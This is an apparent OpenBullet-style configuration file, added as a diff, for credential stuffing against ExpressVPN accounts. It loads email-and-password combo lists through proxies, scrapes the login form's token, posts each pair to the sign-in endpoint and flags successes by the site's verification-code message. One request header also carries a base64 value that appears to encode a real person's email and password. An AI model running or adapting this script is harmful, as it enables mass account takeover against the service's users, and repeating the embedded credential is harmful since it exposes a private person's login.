@@ -1,0 +1,79 @@
+﻿[SETTINGS]
+{
+  "Name": "EXPRESSVPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-04T10:41:45.8240025+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.expressvpn.com/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "authenticity_token\" value=\"" "\" />" -> VAR "tok" 
+
+FUNCTION URLDecode "utf8=✓&authenticity_token=<tok>&email=<USER>&password=<PASS>" -> VAR "post" 
+
+REQUEST POST "https://www.expressvpn.com/sessions" 
+  CONTENT "<post>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.expressvpn.com" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Proxy-Authorization: Basic Zm9saW8ucm9sYW5kQG9yYW5nZS5mcjpjaGFjb2l0ZQ==" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 164" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "To sign in, please enter the verification code sent to" 
+  KEYCHAIN Failure OR 
+    KEY "The change you wanted was rejected." 
+
